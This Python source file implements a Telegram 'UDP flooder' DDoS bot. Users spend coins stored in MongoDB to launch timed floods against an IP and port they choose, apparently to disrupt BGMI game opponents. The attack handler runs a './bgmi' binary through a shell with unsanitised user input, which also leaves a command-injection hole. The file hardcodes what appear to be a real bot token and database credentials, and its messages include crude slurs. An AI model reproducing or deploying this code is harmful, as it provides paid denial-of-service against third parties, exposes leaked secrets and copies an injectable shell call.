import asyncio
import os
import sys
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

# --- Configuration ---
TELEGRAM_BOT_TOKEN = '8647083732:AAHnRuZw6y7EM4iJrFFqfSxkRhWJosvlcUA'  # REPLACE WITH YOUR TOKEN
ADMIN_USER_ID = 1240179115
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "legxninja"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 240
COINS_REQUIRED_PER_ATTACK = 5

# --- Global Variables ---
bot_start_time = datetime.now()
attack_in_progress = False
attack_end_time = None  # Fixed: Define this globally

# --- MongoDB Setup ---
# Fix for Windows asyncio runtime policy if applicable
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

# --- Database Functions ---
async def get_user(user_id):
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

# --- Command Handlers ---
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO @NINJAGAMEROP ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
        "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: @NINJAGAMEROP*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def ninja(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /ninja <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    try:
        command, target_user_id, coins = args
        coins = int(coins)
        target_user_id = int(target_user_id)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid arguments. User ID and Coins must be numbers.*", parse_mode='Markdown')
        return

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid command. Use 'add' or 'rem'.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @NINJAGAMEROP*",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        if attack_end_time:
            remaining_time = (attack_end_time - datetime.now()).total_seconds()
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack already in progress.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 240*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    
    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Port and Duration must be numbers!*", parse_mode='Markdown')
        return

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text="*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*",
            parse_mode='Markdown'
        )
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
            f"*📉 Remaining Balance: {new_balance}*\n\n"
            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    
    try:
        # WARNING: Ensure './bgmi' binary exists in the same directory as this script
        command = f"./bgmi {ip} {port} {duration} {13} {600}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n"
                f"*🕒 Duration: {duration} seconds*\n\n"
                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
            ),
            parse_mode='Markdown'
        )

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    user = await get_user(user_id)

    balance = user["coins"]
    message = (
        f"*📝 Tera info check kar le, Gandu hacker:*\n"
        f"*💰 Coins: {balance}*\n"
        f"*😏 Status: Approved*\n"
        f"*Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ @NINJAGAMEROP VIP DDOS Bot Help Menu 🛠️*\n\n"
        "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
        "📜 *Available Commands:* 📜\n\n"
        "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
        "   - *Is command ka use karke tum attack laga sakte ho.*\n"
        "   - *Example: /attack 192.168.1.1 20876 240*\n"
        "   - *📝 Note: Duration 240 seconds se zyada nahi ho sakta.*\n\n"
        "2️⃣ *💳 /myinfo*\n"
        "   - *Apne account ka status aur coins check karne ke liye.*\n\n"
        "3️⃣ *🔧 /uptime*\n"
        "   - *Bot ka uptime check karo.*\n\n"
        "4️⃣ *👤 /users*\n"
        "   - *Kitne users is bot per added hai (Admin Only).*\n\n"
        "5️⃣ *❌ /remove*\n"
        "   - *Users ko bot se nikalna (Admin Only).*\n\n"
        "🚨 *Important Tips:* 🚨\n"
        "- *Agar koi dikkat aaye toh admin ko contact karo: @NINJAGAMEROP*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*🖕 Chal nikal Chakke! Teri aukaat nahi hai yeh command chalane ki chmod wale NOOB.*",
            parse_mode='Markdown'
        )
        return

    users_cursor = users_collection.find()
    user_data = await users_cursor.to_list(length=None)

    if not user_data:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No users found in the database.*", parse_mode='Markdown')
        return

    message = "*📊 List of all users: 📊*\n\n"
    for user in user_data:
        user_id = user.get('user_id', 'N/A')
        coins = user.get('coins', 'N/A')
        message += f"**User ID:** {user_id}  |  **Coins:** {coins}\n"

    # Telegram message limit is 4096 chars
    if len(message) > 4000:
        message = message[:4000] + "..."

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*🖕 Chal nikal! Teri aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ User ID must be a number.*", parse_mode='Markdown')
        return

    result = await users_collection.delete_one({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko nikal diya h malik.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_user_id} ye chutiya is bot m nhi h malik.*", parse_mode='Markdown')

def main():
    # Build the Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ninja", ninja))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("remove", remove_user))

    # Run the bot
    print("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
